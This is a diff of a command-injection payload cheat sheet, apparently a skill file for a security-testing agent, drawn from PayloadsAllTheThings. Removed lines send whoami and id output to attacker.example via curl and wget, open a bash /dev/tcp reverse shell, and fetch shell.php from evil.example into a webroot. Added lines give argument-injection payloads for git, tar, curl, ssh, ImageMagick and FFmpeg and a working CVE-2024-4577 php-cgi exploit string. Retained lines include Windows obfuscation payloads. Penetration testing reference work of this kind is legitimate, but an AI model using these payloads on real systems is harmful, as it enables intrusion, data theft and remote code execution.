@@ -1,5 +1,5 @@
 ---
-description: Blind detection, filter bypass, Linux/Windows, argument injection
+description: Argument injection per wrapper tool, Windows obfuscation, backslash-newline splitting, polyglots
 skill: command-injection
 source: PayloadsAllTheThings — Command Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -10,98 +10,7 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 > Source: PayloadsAllTheThings — Command Injection
 
-## Basic Injection Operators
-
-```bash
-# Semicolon — sequential execution
-;id
-;cat /etc/passwd
-
-# Pipe — output redirection
-|id
-|cat /etc/passwd
-
-# AND — execute if first succeeds
-&&id
-&&cat /etc/passwd
-
-# OR — execute if first fails
-||id
-||cat /etc/passwd
-
-# Background execution
-&id
-&cat /etc/passwd
-
-# Backtick substitution
-`id`
-`cat /etc/passwd`
-
-# $() substitution
-$(id)
-$(cat /etc/passwd)
-
-# Newline (%0a URL-encoded)
-%0aid
-%0acat%20/etc/passwd
-```
-
-## Blind Detection
-
-### Time-Based
-
-```bash
-;sleep 5
-|sleep 5
-&&sleep 5
-||sleep 5
-$(sleep 5)
-`sleep 5`
-```
-
-### DNS Callback
-
-```bash
-;nslookup attacker.example
-$(nslookup attacker.example)
-`nslookup attacker.example`
-;for i in $(ls /) ; do host "$i.xxxx.burpcollaborator.net"; done
-```
-
-### HTTP Callback
-
-```bash
-;curl https://attacker.example/?d=$(whoami)
-;wget https://attacker.example/?d=$(id)
-$(curl https://attacker.example/$(whoami))
-```
-
-### Conditional Time-Based (Data Extraction)
-
-```bash
-if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi
-```
-
 ## Filter Bypass — Spaces
-
-```bash
-# $IFS (Internal Field Separator)
-cat${IFS}/etc/passwd
-ls${IFS}-la
-
-# Brace expansion
-{cat,/etc/passwd}
-{ls,-la,/}
-
-# Input redirection
-cat</etc/passwd
-
-# Tab (%09 URL-encoded)
-;cat%09/etc/passwd
-
-# ANSI-C Quoting
-X=$'cat\x20/etc/passwd'&&$X
-```
 
 ### Windows Space Bypass
 
@@ -109,47 +18,7 @@ X=$'cat\x20/etc/passwd'&&$X
 ping%CommonProgramFiles:~10,-18%127.0.0.1
 ```
 
-## Filter Bypass — Command Name
-
-```bash
-# Quote insertion
-w'h'o'am'i
-wh''oami
-w"h"o"am"i
-
-# Backslash insertion
-w\ho\am\i
-/\b\i\n/////s\h
-
-# Variable expansion
-who$@ami
-who$()ami
-
-# Wildcard globbing
-/???/??t /???/p??s??
-/???/??n/c?t /???/p??s??
-
-# Variable concatenation
-a=c;b=at;c=/etc/passwd;$a$b $c
-```
-
 ## Filter Bypass — Encoding
-
-### Hex Encoding
-
-```bash
-echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
-cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
-xxd -r -p <<< 2f6574632f706173737764
-```
-
-### Base64 Encoding
-
-```bash
-echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
-bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
-```
 
 ### Backslash-Newline (URL-Encoded)
 
@@ -157,29 +26,9 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
 cat%20/et%5C%0Ac/pa%5C%0Asswd
 ```
 
-## Linux-Specific Payloads
-
-```bash
-# Using $HOME variable
-cat ${HOME:0:1}etc${HOME:0:1}passwd
-
-# tr-based char substitution
-echo . | tr '!-0' '"-1'
-cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-
-# Reverse shell
-bash -i >& /dev/tcp/attacker/4444 0>&1
-```
-
 ## Windows-Specific Payloads
 
 ```cmd
-whoami
-wHoAmI
-type C:\Windows\win.ini
-
-:: PowerShell execution
-powershell -c "whoami"
 powershell C:\*\*2\n??e*d.*?
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e whoami
 ```
@@ -187,21 +36,38 @@ powershell C:\*\*2\n??e*d.*?
 ## Argument Injection
 
 ```bash
-# SSH ProxyCommand
-ssh '-oProxyCommand="touch /tmp/pwned"' foo@foo
-
-# curl output
-curl http://evil.example/shell.php -o /var/www/html/shell.php
-
 # Chrome GPU launcher
 chrome '--gpu-launcher="id>/tmp/foo"'
 
 # psql output
 psql -o'|id>/tmp/foo'
-
-# tar checkpoint
-tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=id
 ```
+
+### By wrapper tool
+
+Input passed as an argv element (no shell) ignores separators; extra flags are the attack.
+
+- **git:** `--upload-pack='<cmd>'` on clone/fetch; `-c core.sshCommand='<cmd>'`; `--template=<dir>`
+  on init (hooks). The `ext::` transport is disabled by default (`protocol.allow`, git ≥ 2.12), so
+  it works only where the app re-enables it. `git clone -- <url>` blocks flag injection.
+- **tar:** `--checkpoint-action=exec=<cmd>`, `--to-command=<cmd>`, `--use-compress-program=<cmd>`
+  (backup/restore features, auto-extracting uploads).
+- **curl/wget:** `-o <webroot path>` (write), `-T <file> <url>` and `wget --post-file=<file>`
+  (exfiltrate); `--upload-file`.
+- **ssh:** `-oProxyCommand=<cmd>` as a hostname.
+- **ImageMagick:** MSL scripts disguised as images and the `msl:`/`ephemeral:` pseudo-protocols
+  (file read/write), SVG `<image>`/`url()` references (SSRF), filename delegates in old versions
+  (CVE-2016-3714 lineage).
+- **FFmpeg:** HLS playlists with `#EXT-X-MAP:URI="file:///etc/passwd"` render file contents into
+  the transcoded output; `concat:` and playlist `http://` entries give SSRF; subtitle URLs fetch
+  server-side.
+- **`--` placement:** check that the terminator sits before your input; some programs still act
+  on dangerous positional arguments after it.
+- **PHP-CGI on Windows (CVE-2024-4577; XAMPP and other CGI-mode installs):** under some code pages
+  (Chinese, Japanese) Windows "Best-Fit" maps the soft hyphen `%AD` to `-`, so a query string
+  becomes php-cgi arguments: `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`
+  with PHP in the POST body. Unaffected: PHP ≥ 8.1.29 / 8.2.20 / 8.3.8, mod_php and PHP-FPM. Code
+  execution: send a benign marker (`<?php echo md5('vigil'); ?>`) and stop there.
 
 ## Polyglot Payloads
 
